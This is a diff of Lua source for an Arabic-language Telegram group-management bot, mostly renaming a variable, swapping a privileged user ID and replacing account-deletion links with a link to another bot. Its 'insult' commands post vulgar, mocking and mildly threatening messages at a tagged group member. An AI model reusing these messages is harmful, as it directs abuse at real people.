 return https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(Text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
 end
---     Source Jenral     --
+--     Source JENRAL     --
 if text == 'تعطيل اطردني' and Manager(msg) and ChCheck(msg) then
-DevALI:set(Jenral.."ALI:Kick:Me"..msg.chat_id_, true)
-local JenralTEAM = '⌁︙اهلا عزيزي ↫ '..ALIRank(msg)..' \n⌁︙تم تعطيل امر اطردني'
-ALImoned(msg.chat_id_, msg.sender_user_id_, msg.id_, JenralTEAM, 14, string.len(msg.sender_user_id_))
+DevALI:set(JENRAL.."ALI:Kick:Me"..msg.chat_id_, true)
+local JENRALTEAM = '⌁︙اهلا عزيزي ↫ '..ALIRank(msg)..' \n⌁︙تم تعطيل امر اطردني'
+ALImoned(msg.chat_id_, msg.sender_user_id_, msg.id_, JENRALTEAM, 14, string.len(msg.sender_user_id_))
 end
 if text == 'تفعيل اطردني' and Manager(msg) and ChCheck(msg) then
-DevALI:del(Jenral.."ALI:Kick:Me"..msg.chat_id_)
-local JenralTEAM = '⌁︙اهلا عزيزي ↫ '..ALIRank(msg)..' \n⌁︙تم تفعيل امر اطردني'
-ALImoned(msg.chat_id_, msg.sender_user_id_, msg.id_, JenralTEAM, 14, string.len(msg.sender_user_id_))
+DevALI:del(JENRAL.."ALI:Kick:Me"..msg.chat_id_)
+local JENRALTEAM = '⌁︙اهلا عزيزي ↫ '..ALIRank(msg)..' \n⌁︙تم تفعيل امر اطردني'
+ALImoned(msg.chat_id_, msg.sender_user_id_, msg.id_, JENRALTEAM, 14, string.len(msg.sender_user_id_))
 end
---     Source Jenral     --
+--     Source JENRAL     --
 if text == "نزلني" and ChCheck(msg) then
-if DevALI:get(Jenral.."ALI:Del:Me"..msg.chat_id_) then
+if DevALI:get(JENRAL.."ALI:Del:Me"..msg.chat_id_) then
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙عذرا هذه الخاصيه معطله ', 1, 'md')
 return false
 end
-DevALI:set(Jenral..'yesdel'..msg.sender_user_id_, 'delyes')
-DevALI:set(Jenral..'nodel'..msg.sender_user_id_, 'delno')
+DevALI:set(JENRAL..'yesdel'..msg.sender_user_id_, 'delyes')
+DevALI:set(JENRAL..'nodel'..msg.sender_user_id_, 'delno')
 local Text = '⌁︙هل انت متأكد من تنزيلك'
 keyboard = {} 
 keyboard.inline_keyboard = {{{text="نعم",callback_data="/yesdel"},{text="لا",callback_data="/nodel"}}} 
 Msg_id = msg.id_/2097152/0.5
 return https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(Text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
 end
---     Source Jenral     --
+--     Source JENRAL     --
 if text == 'تعطيل نزلني' and BasicConstructor(msg) and ChCheck(msg) then
-DevALI:set(Jenral.."ALI:Del:Me"..msg.chat_id_, true)
-local JenralTEAM = '⌁︙اهلا عزيزي ↫ '..ALIRank(msg)..' \n⌁︙تم تعطيل امر نزلني'
-ALImoned(msg.chat_id_, msg.sender_user_id_, msg.id_, JenralTEAM, 14, string.len(msg.sender_user_id_))
+DevALI:set(JENRAL.."ALI:Del:Me"..msg.chat_id_, true)
+local JENRALTEAM = '⌁︙اهلا عزيزي ↫ '..ALIRank(msg)..' \n⌁︙تم تعطيل امر نزلني'
+ALImoned(msg.chat_id_, msg.sender_user_id_, msg.id_, JENRALTEAM, 14, string.len(msg.sender_user_id_))
 end
 if text == 'تفعيل نزلني' and BasicConstructor(msg) and ChCheck(msg) then
-DevALI:del(Jenral.."ALI:Del:Me"..msg.chat_id_)
-local JenralTEAM = '⌁︙اهلا عزيزي ↫ '..ALIRank(msg)..' \n⌁︙تم تفعيل امر نزلني'
-ALImoned(msg.chat_id_, msg.sender_user_id_, msg.id_, JenralTEAM, 14, string.len(msg.sender_user_id_))
+DevALI:del(JENRAL.."ALI:Del:Me"..msg.chat_id_)
+local JENRALTEAM = '⌁︙اهلا عزيزي ↫ '..ALIRank(msg)..' \n⌁︙تم تفعيل امر نزلني'
+ALImoned(msg.chat_id_, msg.sender_user_id_, msg.id_, JENRALTEAM, 14, string.len(msg.sender_user_id_))
 end
---     Source Jenral     --
+--     Source JENRAL     --
 if text and (text == 'تفعيل التاك' or text == 'تفعيل التاك للكل' or text == 'تفعيل تاك للكل') and Admin(msg) and ChCheck(msg) then 
-local JenralTEAM = '⌁︙اهلا عزيزي ↫ '..ALIRank(msg)..' \n⌁︙تم تفعيل امر تاك للكل'
-ALImoned(msg.chat_id_, msg.sender_user_id_, msg.id_, JenralTEAM, 14, string.len(msg.sender_user_id_))
-DevALI:del(Jenral..'ALI:Lock:TagAll'..msg.chat_id_)
+local JENRALTEAM = '⌁︙اهلا عزيزي ↫ '..ALIRank(msg)..' \n⌁︙تم تفعيل امر تاك للكل'
+ALImoned(msg.chat_id_, msg.sender_user_id_, msg.id_, JENRALTEAM, 14, string.len(msg.sender_user_id_))
+DevALI:del(JENRAL..'ALI:Lock:TagAll'..msg.chat_id_)
 end
 if text and (text == 'تعطيل التاك' or text == 'تعطيل التاك للكل' or text == 'تعطيل تاك للكل') and Admin(msg) and ChCheck(msg) then 
-local JenralTEAM = '⌁︙اهلا عزيزي ↫ '..ALIRank(msg)..' \n⌁︙تم تعطيل امر تاك للكل'
-ALImoned(msg.chat_id_, msg.sender_user_id_, msg.id_, JenralTEAM, 14, string.len(msg.sender_user_id_))
-DevALI:set(Jenral..'ALI:Lock:TagAll'..msg.chat_id_,true)
+local JENRALTEAM = '⌁︙اهلا عزيزي ↫ '..ALIRank(msg)..' \n⌁︙تم تعطيل امر تاك للكل'
+ALImoned(msg.chat_id_, msg.sender_user_id_, msg.id_, JENRALTEAM, 14, string.len(msg.sender_user_id_))
+DevALI:set(JENRAL..'ALI:Lock:TagAll'..msg.chat_id_,true)
 end
 if Admin(msg) then
 if text == "تاك للكل" and ChCheck(msg) then
-if not DevALI:get(Jenral..'ALI:Lock:TagAll'..msg.chat_id_) then
+if not DevALI:get(JENRAL..'ALI:Lock:TagAll'..msg.chat_id_) then
 function TagAll(dp1,dp2)
 local text = "⌁︙وينكم يالربع \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
 i = 0
 for k, v in pairs(dp2.members_) do
 i = i + 1
-if DevALI:get(Jenral..'Save:UserName'..v.user_id_) then
-text = text..i.."~ : [@"..DevALI:get(Jenral..'Save:UserName'..v.user_id_).."]\n"
+if DevALI:get(JENRAL..'Save:UserName'..v.user_id_) then
+text = text..i.."~ : [@"..DevALI:get(JENRAL..'Save:UserName'..v.user_id_).."]\n"
 else
 text = text..i.."~ : "..v.user_id_.."\n"
 end
@@ -4270,17 +4269,17 @@ end
 tdcli_function({ID = "GetChannelMembers",channel_id_ = getChatId(msg.chat_id_).ID, offset_ = 0,limit_ = 200000},TagAll,nil)
 end
 end
---     Source Jenral     --
+--     Source JENRAL     --
 if text and text:match("^كللهم (.*)$") and ChCheck(msg) then
 local txt = {string.match(text, "^(كللهم) (.*)$")}
-if not DevALI:get(Jenral..'ALI:Lock:TagAll'..msg.chat_id_) then
+if not DevALI:get(JENRAL..'ALI:Lock:TagAll'..msg.chat_id_) then
 function TagAll(dp1,dp2)
 local text = "⌁︙"..txt[2].." \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
 i = 0
 for k, v in pairs(dp2.members_) do
 i = i + 1
-if DevALI:get(Jenral..'Save:UserName'..v.user_id_) then
-text = text..i.."~ : [@"..DevALI:get(Jenral..'Save:UserName'..v.user_id_).."]\n"
+if DevALI:get(JENRAL..'Save:UserName'..v.user_id_) then
+text = text..i.."~ : [@"..DevALI:get(JENRAL..'Save:UserName'..v.user_id_).."]\n"
 else
 text = text..i.."~ : "..v.user_id_.."\n"
 end
@@ -4291,18 +4290,18 @@ tdcli_function({ID = "GetChannelMembers",channel_id_ = getChatId(msg.chat_id_).I
 end
 end
 end
---     Source Jenral     --
+--     Source JENRAL     --
 if text == "رسائلي" and msg.reply_to_message_id_ == 0 and ChCheck(msg) then
-local user_msgs = DevALI:get(Jenral..'ALI:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
+local user_msgs = DevALI:get(JENRAL..'ALI:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
 Dev_ALI(msg.chat_id_, msg.id_, 1, "⌁︙عدد رسائلك هنا ↫ *❨ "..user_msgs.." ❩*", 1, 'md')
 end
 if text == "التفاعل" and ChCheck(msg) then
-local EntryNumber = (DevALI:get(Jenral..'ALI:EntryNumber'..msg.chat_id_..':'..os.date('%d')) or 0)
-local ExitNumber = (DevALI:get(Jenral..'ALI:ExitNumber'..msg.chat_id_..':'..os.date('%d')) or 0)
-local MsgNumberDay = (DevALI:get(Jenral..'ALI:MsgNumberDay'..msg.chat_id_..':'..os.date('%d')) or 0)
+local EntryNumber = (DevALI:get(JENRAL..'ALI:EntryNumber'..msg.chat_id_..':'..os.date('%d')) or 0)
+local ExitNumber = (DevALI:get(JENRAL..'ALI:ExitNumber'..msg.chat_id_..':'..os.date('%d')) or 0)
+local MsgNumberDay = (DevALI:get(JENRAL..'ALI:MsgNumberDay'..msg.chat_id_..':'..os.date('%d')) or 0)
 Dev_ALI(msg.chat_id_, msg.id_, 1, "⌁︙انضمام الاعضاء اليوم ↫ *"..EntryNumber.."*\n⌁︙مغادرة الاعضاء اليوم ↫ *"..ExitNumber.."*\n⌁︙عدد الرسائل اليوم ↫ *"..MsgNumberDay.."*\n⌁︙نسبة التفاعل اليوم ↫ *"..math.random(40,100).."%*", 1, 'md')
 end
---     Source Jenral     --
+--     Source JENRAL     --
 if text == "معرفي" and ChCheck(msg) then
 function get_username(extra,result,success)
 text = '⌁︙معرفك ↫ ❨ User ❩'
@@ -4320,35 +4319,24 @@ Dev_ALI(msg.chat_id_, msg.id_, 1, text, 1, 'html')
 end
 getUser(msg.sender_user_id_,get_firstname)
 end   
---     Source Jenral     --
-if text == "اهمس" or text == "همسه" or text == "اريد بوت الهمسه" or text == "دزلي بوت الهمسه" or  text == "دزولي بوت الهمسه" then  Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙@whisperbot', 1, 'md') end
-if text == 'رابط الحذف' or text == 'رابط حذف' then
-t =[[
-*رابط الحذف في جميع مواقع التواصل ⌔
-فكر قبل لا تتسرع وتروح*
-ٴ
- *⌔ رابط حذف*  [Telegram](https://my.telegram.org/auth?to=delete) ܁
- *⌔ رابط حذف* [instagram](https://www.instagram.com/accounts/login/?next=/accounts/remove/request/permanent/) ܁
- *⌔ رابط حذف* [Facebook](https://www.facebook.com/help/deleteaccount) ܁
- *⌔ رابط حذف* [Snspchat](https://accounts.snapchat.com/accounts/login?continue=https%3A%2F%2Faccounts.snapchat.com%2Faccounts%2Fdeleteaccount) ܁
-]]
-send(msg.chat_id_, msg.id_,t) 
-return false
-end
-if text == "جهاتي" and ChCheck(msg) or text == "اضافاتي" and ChCheck(msg) then add = (tonumber(DevALI:get(Jenral..'ALI:ContactNumber'..msg.chat_id_..':'..msg.sender_user_id_)) or 0) Dev_ALI(msg.chat_id_, msg.id_, 1, "⌁︙عدد جهاتك المضافه ↫ *❨ "..add.." ❩* ", 1, 'md') end
-if text == "تعديلاتي" or text == "سحكاتي" and ChCheck(msg) then local edit_msg = DevALI:get(Jenral..'ALI:EditMsg'..msg.chat_id_..msg.sender_user_id_) or 0  Dev_ALI(msg.chat_id_, msg.id_, 1, "⌁︙عدد تعديلاتك ↫ *❨ "..edit_msg.." ❩* ", 1, 'md') end
+--     Source JENRAL     --
+if text == "اهمس" or text == "همسه" or text == "اريد بوت الهمسه" or text == "دزلي بوت الهمسه" or  text == "دزولي بوت الهمسه" then  Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙@HMSEBOT', 1, 'md') end
+if text == "رابط حذف" or text == "رابط الحذف" or text == "اريد رابط الحذف" or  text == "شمرلي رابط الحذف" or text == "اريد رابط حذف" then local inline = {{{text="اضغط هنا",url="https://t.me/DYFBOT"}}} SendInline(msg.chat_id_,'⌁︙اضغط للحصول على الرابط',nil,inline) return false end
+if text == "بوت الحذف" or text == "اريد بوت الحذف" or text == "اريد بوت حذف" or text == "بوت حذف" or text == "بوت حذف حسابات" or text == "راح احذف" then local inline = {{{text="اضغط هنا",url="https://t.me/DYFBOT"}}} SendInline(msg.chat_id_,'⌁︙اضغط للحصول على البوت',nil,inline) return false end
+if text == "جهاتي" and ChCheck(msg) or text == "اضافاتي" and ChCheck(msg) then add = (tonumber(DevALI:get(JENRAL..'ALI:ContactNumber'..msg.chat_id_..':'..msg.sender_user_id_)) or 0) Dev_ALI(msg.chat_id_, msg.id_, 1, "⌁︙عدد جهاتك المضافه ↫ *❨ "..add.." ❩* ", 1, 'md') end
+if text == "تعديلاتي" or text == "سحكاتي" and ChCheck(msg) then local edit_msg = DevALI:get(JENRAL..'ALI:EditMsg'..msg.chat_id_..msg.sender_user_id_) or 0  Dev_ALI(msg.chat_id_, msg.id_, 1, "⌁︙عدد تعديلاتك ↫ *❨ "..edit_msg.." ❩* ", 1, 'md') end
 if text == "ايديي" and ChCheck(msg) then Dev_ALI(msg.chat_id_, msg.id_, 1,'⌁︙ايديك ↫ ❨ `'..msg.sender_user_id_..'` ❩', 1, 'md') end
 if text == "رتبتي" and ChCheck(msg) then Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙رتبتك ↫ '..IdRank(msg.sender_user_id_, msg.chat_id_), 1, 'html') end
 if text == "ايدي المجموعه" and ChCheck(msg) then Dev_ALI(msg.chat_id_, msg.id_, 1, "⌁︙ايدي المجموعه ↫ `"..msg.chat_id_.."`", 1, 'md') end
-if text == 'مسح سحكاتي' or text == 'مسح تعديلاتي' or text == 'حذف سحكاتي' or text == 'حذف تعديلاتي' then DevALI:del(Jenral..'ALI:EditMsg'..msg.chat_id_..msg.sender_user_id_) Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙تم حذف جميع تعديلاتك بنجاح' , 1, 'md') end
-if text == 'مسح جهاتي' or text == 'مسح اضافاتي' or text == 'حذف جهاتي' or text == 'حذف اضافاتي' then DevALI:del(Jenral..'ALI:ContactNumber'..msg.chat_id_..':'..msg.sender_user_id_) Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙تم حذف جميع جهاتك المضافه' , 1, 'md') end
---     Source Jenral     --
+if text == 'مسح سحكاتي' or text == 'مسح تعديلاتي' or text == 'حذف سحكاتي' or text == 'حذف تعديلاتي' then DevALI:del(JENRAL..'ALI:EditMsg'..msg.chat_id_..msg.sender_user_id_) Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙تم حذف جميع تعديلاتك بنجاح' , 1, 'md') end
+if text == 'مسح جهاتي' or text == 'مسح اضافاتي' or text == 'حذف جهاتي' or text == 'حذف اضافاتي' then DevALI:del(JENRAL..'ALI:ContactNumber'..msg.chat_id_..':'..msg.sender_user_id_) Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙تم حذف جميع جهاتك المضافه' , 1, 'md') end
+--     Source JENRAL     --
 if text == "المطور" then 
-local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChat?chat_id='..DevALI:get(Jenral.."ALI:ChId"))
+local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChat?chat_id='..DevALI:get(JENRAL.."ALI:ChId"))
 local GetInfo = JSON.decode(Check)
 local DevCh1 = GetInfo.result.username
-local DevText = DevALI:get(Jenral.."DevText")
-if DevALI:get(Jenral.."ALI:ChId") then DevCh = '\n⌁︙*Dev Ch* ↬ [@'..DevCh1..']' else DevCh = '' end
+local DevText = DevALI:get(JENRAL.."DevText")
+if DevALI:get(JENRAL.."ALI:ChId") then DevCh = '\n⌁︙*Dev Ch* ↬ [@'..DevCh1..']' else DevCh = '' end
 tdcli_function({ID="GetUser",user_id_=DevId},function(arg,dp) 
 if dp.username_ ~= false then DevUser = '@'..dp.username_ else DevUser = dp.first_name_ end
 if DevText then
@@ -4358,13 +4346,13 @@ Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙*Dev User* ↬ ['..DevUser..']\n⌁︙*
 end
 end,nil)
 end 
---     Source Jenral     --
+--     Source JENRAL     --
 if text and text:match('^هينه @(.*)') and ChCheck(msg) or text and text:match('^هينها @(.*)') then 
-if not DevALI:get(Jenral..'ALI:Lock:Stupid'..msg.chat_id_) then
+if not DevALI:get(JENRAL..'ALI:Lock:Stupid'..msg.chat_id_) then
 local username = text:match('^هينه @(.*)') or text:match('^هينها @(.*)') 
-function JenralTEAM(extra,result,success)
+function JENRALTEAM(extra,result,success)
 if result.id_ then  
-if tonumber(result.id_) == tonumber(Jenral) then  
+if tonumber(result.id_) == tonumber(JENRAL) then  
 Dev_ALI(msg.chat_id_, msg.id_, 1, 'شو تمضرط اكو واحد يهين نفسه؟🤔👌🏿', 1, 'md')  
 return false 
 end  
@@ -4372,30 +4360,30 @@ if tonumber(result.id_) == tonumber(DevId) then
 Dev_ALI(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md') 
 return false  
 end  
-if tonumber(result.id_) == tonumber(218385683) then 
+if tonumber(result.id_) == tonumber(1186878655) then 
 Dev_ALI(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md') 
 return false  
 end  
-if DevALI:sismember(Jenral.."ALI:ALIConstructor:"..msg.chat_id_,result.id_) then
+if DevALI:sismember(JENRAL.."ALI:ALIConstructor:"..msg.chat_id_,result.id_) then
 Dev_ALI(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md')
 return false
 end 
-local JenralTEAM = "صارر ستاذيي 🏃🏻‍♂️♥️" 
-Dev_ALI(msg.chat_id_, msg.id_, 1,JenralTEAM, 1, 'md') 
-local JenralTEAM = { "لكك جرجف @"..username.." احترم اسيادكك لا اكتلكك وازربب على كبركك،💩🖐🏿","هشش لكك فاشل @"..username.." لتضل تمسلت لا اخربط تضاريس وجهك جنه ابط عبده، 😖👌🏿","حبيبي @"..username.." راح احاول احترمكك هالمره بلكي تبطل حيونه، 🤔🔪","دمشي لك @"..username.." ينبوع الفشل مو زين ملفيك ونحجي وياك هي منبوذ 😏🖕🏿","ها الغليض التفس ابو راس المربع @"..username.." متعلملك جم حجايه وجاي تطكطكهن علينه دبطل😒🔪",}
-Dev_ALI(msg.chat_id_, result.id_, 1,''..JenralTEAM[math.random(#JenralTEAM)], 1, 'html') 
+local JENRALTEAM = "صارر ستاذيي 🏃🏻‍♂️♥️" 
+Dev_ALI(msg.chat_id_, msg.id_, 1,JENRALTEAM, 1, 'md') 
+local JENRALTEAM = { "لكك جرجف @"..username.." احترم اسيادكك لا اكتلكك وازربب على كبركك،💩🖐🏿","هشش لكك فاشل @"..username.." لتضل تمسلت لا اخربط تضاريس وجهك جنه ابط عبده، 😖👌🏿","حبيبي @"..username.." راح احاول احترمكك هالمره بلكي تبطل حيونه، 🤔🔪","دمشي لك @"..username.." ينبوع الفشل مو زين ملفيك ونحجي وياك هي منبوذ 😏🖕🏿","ها الغليض التفس ابو راس المربع @"..username.." متعلملك جم حجايه وجاي تطكطكهن علينه دبطل😒🔪",}
+Dev_ALI(msg.chat_id_, result.id_, 1,''..JENRALTEAM[math.random(#JENRALTEAM)], 1, 'html') 
 else  
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙العضو غير موجود في المجموعه', 1, 'md') 
 end 
 end 
-resolve_username(username,JenralTEAM)
+resolve_username(username,JENRALTEAM)
 end
 end
---     Source Jenral     --
+--     Source JENRAL     --
 if text == ("هينه") or text == ("بعد هينه") or text == ("هينه بعد") or text == ("لك هينه") or text == ("هينها") or text == ("هينهه") or text == ("رزله") or text == ("رزلهه") or text == ("رزلها") then
-if not DevALI:get(Jenral..'ALI:Lock:Stupid'..msg.chat_id_) then
+if not DevALI:get(JENRAL..'ALI:Lock:Stupid'..msg.chat_id_) then
 function hena(extra, result, success)
-if tonumber(result.sender_user_id_) == tonumber(Jenral) then 
+if tonumber(result.sender_user_id_) == tonumber(JENRAL) then 
 Dev_ALI(msg.chat_id_, msg.id_, 1, 'شو تمضرط اكو واحد يهين نفسه؟🤔👌🏿', 1, 'md') 
 return false  
 end  
@@ -4403,18 +4391,18 @@ if tonumber(result.sender_user_id_) == tonumber(DevId) then
 Dev_ALI(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md')
 return false
 end 
-if tonumber(result.sender_user_id_) == tonumber(218385683) then  
+if tonumber(result.sender_user_id_) == tonumber(1186878655) then  
 Dev_ALI(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md')
 return false
 end 
-if DevALI:sismember(Jenral.."ALI:ALIConstructor:"..msg.chat_id_,result.sender_user_id_) then
+if DevALI:sismember(JENRAL.."ALI:ALIConstructor:"..msg.chat_id_,result.sender_user_id_) then
 Dev_ALI(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md')
 return false
 end 
-local JenralTEAM = "صارر ستاذيي 🏃🏻‍♂️♥️" 
-Dev_ALI(msg.chat_id_, msg.id_, 1,JenralTEAM, 1, 'md') 
-local JenralTEAM = {"لكك جرجف احترم اسيادكك لا اكتلكك وازربب على كبركك،💩🖐🏿","هشش فاشل لتضل تمسلت لا اخربط تضاريس وجهك جنه ابط عبده، 😖👌🏿","دمشي لك ينبوع الفشل مو زين ملفيك ونحجي وياك هي منبوذ 😏🖕🏿","ها الغليض التفس ابو راس المربع متعلملك جم حجايه وجاي تطكطكهن علينه دبطل😒🔪","حبيبي راح احاول احترمكك هالمره بلكي تبطل حيونه، 🤔🔪"} 
-Dev_ALI(msg.chat_id_, result.id_, 1,''..JenralTEAM[math.random(#JenralTEAM)], 1, 'md') 
+local JENRALTEAM = "صارر ستاذيي 🏃🏻‍♂️♥️" 
+Dev_ALI(msg.chat_id_, msg.id_, 1,JENRALTEAM, 1, 'md') 
+local JENRALTEAM = {"لكك جرجف احترم اسيادكك لا اكتلكك وازربب على كبركك،💩🖐🏿","هشش فاشل لتضل تمسلت لا اخربط تضاريس وجهك جنه ابط عبده، 😖👌🏿","دمشي لك ينبوع الفشل مو زين ملفيك ونحجي وياك هي منبوذ 😏🖕🏿","ها الغليض التفس ابو راس المربع متعلملك جم حجايه وجاي تطكطكهن علينه دبطل😒🔪","حبيبي راح احاول احترمكك هالمره بلكي تبطل حيونه، 🤔🔪"} 
+Dev_ALI(msg.chat_id_, result.id_, 1,''..JENRALTEAM[math.random(#JENRALTEAM)], 1, 'md') 
 end 
 if tonumber(msg.reply_to_message_id_) == 0 then
 else 
@@ -4423,9 +4411,9 @@ end
 end
 end
 if text == ("بوسه") or text == ("بعد بوسه") or text == ("ضل بوس") or text == ("بوسه بعد") or text == ("بوسها") or text == ("بعد بوسها") or text == ("ضل بوس") or text == ("بوسها بعد") or text == ("بوسهه") then
-if not DevALI:get(Jenral..'ALI:Lock:Stupid'..msg.chat_id_) then
+if not DevALI:get(JENRAL..'ALI:Lock:Stupid'..msg.chat_id_) then
 function bosh(extra, result, success)
-if tonumber(result.sender_user_id_) == tonumber(Jenral) then 
+if tonumber(result.sender_user_id_) == tonumber(JENRAL) then 
 Dev_ALI(msg.chat_id_, msg.id_, 1, 'فهمنيي شلوون راحح ابوس نفسيي؟😶💔', 1, 'md') 
 return false  
 end  
@@ -4433,10 +4421,10 @@ if tonumber(result.sender_user_id_) == tonumber(DevId) then
 Dev_ALI(msg.chat_id_, result.id_, 1, 'مواححح احلاا بوسةة المطوريي😻🔥💗', 1, 'html')
 return false
 end 
-local JenralTEAM = "صارر ستاذيي 🏃🏻‍♂️♥️" 
-Dev_ALI(msg.chat_id_, msg.id_, 1,JenralTEAM, 1, 'md') 
-local JenralTEAM = {"مواححح افيش عافيههه😍🔥💗","امممووااهحح شهلعسل🥺🍯💘","مواححح،ءوفف اذوب🤤💗"} 
-Dev_ALI(msg.chat_id_, result.id_, 1,''..JenralTEAM[math.random(#JenralTEAM)], 1, 'md') 
+local JENRALTEAM = "صارر ستاذيي 🏃🏻‍♂️♥️" 
+Dev_ALI(msg.chat_id_, msg.id_, 1,JENRALTEAM, 1, 'md') 
+local JENRALTEAM = {"مواححح افيش عافيههه😍🔥💗","امممووااهحح شهلعسل🥺🍯💘","مواححح،ءوفف اذوب🤤💗"} 
+Dev_ALI(msg.chat_id_, result.id_, 1,''..JENRALTEAM[math.random(#JENRALTEAM)], 1, 'md') 
 end 
 if tonumber(msg.reply_to_message_id_) == 0 then
 else 
@@ -4445,9 +4433,9 @@ end
 end
 end
 if text == ("صيحه") or text == ("صيحها") or text == ("صيحهه") or text == ("صيح") then
-if not DevALI:get(Jenral..'ALI:Lock:Stupid'..msg.chat_id_) then
+if not DevALI:get(JENRAL..'ALI:Lock:Stupid'..msg.chat_id_) then
 function seha(extra, result, success)
-if tonumber(result.sender_user_id_) == tonumber(Jenral) then 
+if tonumber(result.sender_user_id_) == tonumber(JENRAL) then 
 Dev_ALI(msg.chat_id_, msg.id_, 1, 'فهمنيي شلوون راحح اصيح نفسيي؟😶💔', 1, 'md') 
 return false  
 end  
@@ -4455,10 +4443,10 @@ if tonumber(result.sender_user_id_) == tonumber(DevId) then
 Dev_ALI(msg.chat_id_, result.id_, 1, 'تعال مطوريي محتاجيكك🏃🏻‍♂️♥️', 1, 'html')
 return false
 end 
-local JenralTEAM = "صارر ستاذيي 🏃🏻‍♂️♥️" 
-Dev_ALI(msg.chat_id_, msg.id_, 1,JenralTEAM, 1, 'md') 
-local JenralTEAM = {"تتعال ححب محتاجيك🙂🍭","تعال يولل استاذكك ايريدككك😒🔪","يمعوود تعاال يريدوكك🤕♥️","تعال لكك ديصيحوك😐🖤"} 
-Dev_ALI(msg.chat_id_, result.id_, 1,''..JenralTEAM[math.random(#JenralTEAM)], 1, 'md') 
+local JENRALTEAM = "صارر ستاذيي 🏃🏻‍♂️♥️" 
+Dev_ALI(msg.chat_id_, msg.id_, 1,JENRALTEAM, 1, 'md') 
+local JENRALTEAM = {"تتعال ححب محتاجيك🙂🍭","تعال يولل استاذكك ايريدككك😒🔪","يمعوود تعاال يريدوكك🤕♥️","تعال لكك ديصيحوك😐🖤"} 
+Dev_ALI(msg.chat_id_, result.id_, 1,''..JENRALTEAM[math.random(#JENRALTEAM)], 1, 'md') 
 end 
 if tonumber(msg.reply_to_message_id_) == 0 then
 else 
@@ -4466,13 +4454,13 @@ getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),seha)
 end
 end
 end
---     Source Jenral     --
+--     Source JENRAL     --
 if text and text:match('^صيحه @(.*)') and ChCheck(msg) or text and text:match('^صيح @(.*)') and ChCheck(msg) then 
-if not DevALI:get(Jenral..'ALI:Lock:Stupid'..msg.chat_id_) then
+if not DevALI:get(JENRAL..'ALI:Lock:Stupid'..msg.chat_id_) then
 local username = text:match('^صيحه @(.*)') or text:match('^صيح @(.*)') 
-function JenralTEAM(extra,result,success)
+function JENRALTEAM(extra,result,success)
 if result.id_ then  
-if tonumber(result.id_) == tonumber(Jenral) then  
+if tonumber(result.id_) == tonumber(JENRAL) then  
 Dev_ALI(msg.chat_id_, msg.id_, 1, 'فهمنيي شلوون راحح اصيح نفسيي؟😶💔', 1, 'md')  
 return false 
 end  
@@ -4480,46 +4468,46 @@ if tonumber(result.id_) == tonumber(DevId) then
 Dev_ALI(msg.chat_id_, msg.id_, 1, 'تعال مطوريي محتاجيكك🏃🏻‍♂️♥️ @'..username, 1, 'html') 
 return false  
 end  
-local JenralTEAM = "صارر ستاذيي 🏃🏻‍♂️♥️" 
-Dev_ALI(msg.chat_id_, msg.id_, 1,JenralTEAM, 1, 'md') 
-local JenralTEAM = { "تتعال ححب @"..username.." محتاجيك🙂🍭","تعال يولل @"..username.." استاذكك ايريدككك😒🔪","يمعوود @"..username.." تعاال يريدوكك🤕♥️","تعال لكك @"..username.." ديصيحوك😐🖤",}
-Dev_ALI(msg.chat_id_, result.id_, 1,''..JenralTEAM[math.random(#JenralTEAM)], 1, 'html') 
+local JENRALTEAM = "صارر ستاذيي 🏃🏻‍♂️♥️" 
+Dev_ALI(msg.chat_id_, msg.id_, 1,JENRALTEAM, 1, 'md') 
+local JENRALTEAM = { "تتعال ححب @"..username.." محتاجيك🙂🍭","تعال يولل @"..username.." استاذكك ايريدككك😒🔪","يمعوود @"..username.." تعاال يريدوكك🤕♥️","تعال لكك @"..username.." ديصيحوك😐🖤",}
+Dev_ALI(msg.chat_id_, result.id_, 1,''..JENRALTEAM[math.random(#JENRALTEAM)], 1, 'html') 
 else  
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙العضو غير موجود في المجموعه', 1, 'md') 
 end 
 end 
-resolve_username(username,JenralTEAM)
+resolve_username(username,JENRALTEAM)
 end
 end
 end
---     Source Jenral     --
+--     Source JENRAL     --
 if text == ("تنزيل الكل") and msg.reply_to_message_id_ ~= 0 and Manager(msg) and ChCheck(msg) then 
 function promote_by_reply(extra, result, success)
 if SudoId(result.sender_user_id_) == true then
 Dev_ALI(msg.chat_id_, msg.id_, 1, "⌁︙لاتستطيع تنزيل المطور الاساسي", 1, 'md')
 return false 
 end
-if DevALI:sismember(Jenral..'ALI:SecondSudo:',result.sender_user_id_) then
